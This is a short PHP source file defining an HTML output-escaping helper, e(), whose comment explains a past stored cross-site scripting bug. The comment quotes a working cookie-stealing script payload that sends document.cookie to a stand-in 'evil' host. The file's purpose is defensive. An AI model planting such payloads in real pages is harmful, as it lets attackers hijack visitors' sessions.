<?php
/**
 * Output escaping.
 *
 * Everything printed into the HTML comes from the database or from the browser,
 * and both can carry markup. An expense item of
 * `<script>document.location='http://evil/?c='+document.cookie</script>` was
 * stored as-is and printed as-is, so it ran in the next visitor's session —
 * stored cross-site scripting.
 *
 * e() turns &, <, >, " and ' into entities, so the value is displayed exactly as
 * typed and never parsed as HTML. ENT_QUOTES matters because these values are
 * also printed inside value="..." attributes, where an unescaped quote would end
 * the attribute.
 */

function e($value): string
{
    return htmlspecialchars((string) $value, ENT_QUOTES, 'UTF-8');
}
